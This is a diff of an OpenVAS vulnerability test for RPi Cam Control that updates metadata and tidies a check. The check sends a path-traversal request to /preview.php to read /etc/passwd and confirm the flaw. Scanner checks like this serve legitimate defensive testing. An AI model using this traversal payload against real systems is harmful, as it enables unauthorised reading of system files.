@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_rpi_cam_control_multiple_vuln.nasl 8627 2018-02-01 15:16:06Z cfischer $
+# $Id: gb_rpi_cam_control_multiple_vuln.nasl 9738 2018-05-07 04:50:48Z ckuersteiner $
 #
 # RPi Cam Control Multiple Vulnerabilities
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:rpi:cam_control";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.812362");
-  script_version("$Revision: 8627 $");
+  script_version("$Revision: 9738 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-02-01 16:16:06 +0100 (Thu, 01 Feb 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-07 06:50:48 +0200 (Mon, 07 May 2018) $");
   script_tag(name:"creation_date", value:"2017-12-26 14:19:48 +0530 (Tue, 26 Dec 2017)");
   script_name("RPi Cam Control Multiple Vulnerabilities");
 
@@ -54,10 +54,8 @@ if(description)
 
   script_tag(name:"affected", value:"RPi Cam Control versions through 6.4.14");
 
-  script_tag(name:"solution", value:"No solution or patch is available as of
-  01th February, 2018. Information regarding this issue will be updated once solution
-  details are available. For updates refer to,
-  https://github.com/silvanmelchior/RPi_Cam_Web_Interface");
+  script_tag(name:"solution", value:"No solution or patch is available as of 07th May, 2018. Information
+regarding this issue will be updated once solution details are available.");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
@@ -78,21 +76,19 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-ripPort = "";
-dir = "";
-
-if(!ripPort = get_app_port(cpe:CPE)){
+if (!ripPort = get_app_port(cpe:CPE))
   exit(0);
-}
 
 postData = "download1=../../../../../../../../../../../../../../../../etc/passwd.v0000.t";
 req = http_post_req(port:ripPort, url:"/preview.php", data:postData,
       add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
 res = http_keepalive_send_recv(port:ripPort, data: req);
+
 if(res =~ "HTTP/1.. 200 OK" && res =~ "root:.*:0:[01]:")
 {
   report = report_vuln_url(port:ripPort, url:"/preview.php");
   security_message(port:ripPort, data:report);
   exit(0);
 }
-exit(0);
+
+exit(99);
